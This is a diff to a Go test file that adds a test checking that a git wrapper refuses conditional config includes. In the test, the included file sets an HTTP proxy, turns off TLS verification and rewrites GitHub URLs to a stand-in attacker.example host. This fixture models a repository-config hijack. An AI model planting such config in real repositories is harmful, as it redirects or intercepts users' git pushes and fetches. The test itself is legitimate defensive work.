@@ -1,15 +1,18 @@
 package gitx
 
 import (
+	"bufio"
 	"bytes"
 	"context"
 	"errors"
 	"fmt"
+	"net"
 	"os"
 	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
+	"time"
 )
 
 func TestIsLocalURL(t *testing.T) {
@@ -521,7 +524,7 @@ func TestTransportRefusesRepoURLRewrites(t *testing.T) {
 			inc := filepath.Join(f.root, "inc")
 			writeFile(t, inc, "[url \""+decoy+"\"]\n\tinsteadOf = "+f.origin+"\n")
 			git(t, f.repo, "config", "include.path", inc)
-		}, "url.DECOY.insteadof"},
+		}, "include.path"}, // the include itself, before what it brings in
 		{"global insteadOf", func(t *testing.T, f fixture, wt, decoy string) {
 			global := filepath.Join(f.root, "gitconfig")
 			writeFile(t, global, "[url \""+f.origin+"\"]\n\tinsteadOf = elsewhere:\n\tpushInsteadOf = elsewhere:\n")
@@ -582,6 +585,67 @@ func TestTransportRefusesRepoHTTPSettings(t *testing.T) {
 	hs, err := Hazards(ctx, f.repo, &Origin{URLs: []string{"git@example.invalid:o/r.git"}})
 	if err != nil || len(hs) != 0 {
 		t.Errorf("with an ssh origin: %+v, %v", hs, err)
+	}
+}
+
+// TestTransportRefusesIncludes: http.* and insteadOf settings hidden behind
+// an include whose condition is false for the check but true for the
+// command (hasconfig:remote.*.url matches the stand-in remote the command
+// defines with -c) never reach a push, fetch or remote check: the include
+// itself is refused, and nothing connects to the task's proxy.
+func TestTransportRefusesIncludes(t *testing.T) {
+	ctx := context.Background()
+	f := newFixture(t)
+	wt, _ := f.addWorktree(t, ctx, "x")
+	commitFile(t, wt, "a.txt", "a\n", "task commit")
+	pinned := to("https://github.com/example/api.git")
+
+	l, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer l.Close()
+	connected := make(chan string, 8)
+	go func() {
+		for {
+			c, err := l.Accept()
+			if err != nil {
+				return
+			}
+			line, _ := bufio.NewReader(c).ReadString('\n')
+			connected <- strings.TrimSpace(line)
+			c.Close()
+		}
+	}()
+
+	// What the task writes in its clone's config: origin elsewhere (atl only
+	// warns about that and uses the pin), and its settings in a file
+	// included only when a remote has the pinned URL.
+	git(t, f.repo, "config", "remote.origin.url", "https://example.invalid/whatever.git")
+	evil := filepath.Join(f.root, "evil.cfg")
+	writeFile(t, evil, "[http]\n\tproxy = http://"+l.Addr().String()+"\n\tsslVerify = false\n"+
+		"[url \"https://attacker.example/\"]\n\tinsteadOf = https://github.com/\n")
+	key := "includeif.hasconfig:remote.*.url:https://github.com/example/api.git.path"
+	git(t, f.repo, "config", key, evil)
+
+	for op, err := range map[string]error{
+		"push":      PushBranch(ctx, wt, pinned, "atl/x", false, nil),
+		"fetch":     FetchOrigin(ctx, wt, pinned, nil),
+		"ls-remote": func() error { _, err := RemoteBranchExists(ctx, wt, pinned, "atl/x"); return err }(),
+	} {
+		var re *RefusedError
+		if !errors.As(err, &re) || re.Key != key || re.Value != evil {
+			t.Errorf("%s: %v, want a refusal naming the include", op, err)
+		}
+	}
+	select {
+	case line := <-connected:
+		t.Errorf("git connected to the task's proxy: %q", line)
+	case <-time.After(200 * time.Millisecond):
+	}
+	hs, err := Hazards(ctx, wt, &pinned)
+	if err != nil || len(hs) != 1 || hs[0].Key != key {
+		t.Errorf("Hazards (atl doctor) = %+v, %v; want the include", hs, err)
 	}
 }
 
